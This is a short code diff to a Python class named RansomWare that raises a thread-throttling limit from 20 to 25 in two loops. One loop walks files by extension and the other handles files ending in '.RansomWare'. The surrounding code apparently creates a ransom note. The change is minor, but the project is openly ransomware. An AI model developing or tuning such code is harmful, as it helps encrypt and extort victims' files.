@@ -399,7 +399,7 @@ class RansomWare:
 
                         if self.check_file_extension(full_path):
                             print(full_path)
-                            while (self.many > 20): pass
+                            while (self.many > 25): pass
                             threading.Thread(target=lambda: self.threading_e(full_path)).start()
         
         self.MakeReadMe()
@@ -423,7 +423,7 @@ class RansomWare:
 
                         if full_path.endswith(".RansomWare"):
                             print(full_path)
-                            while (self.many > 20): pass
+                            while (self.many > 25): pass
                             threading.Thread(target=lambda: self.threading_e(full_path)).start()
 
     def startRW(self):
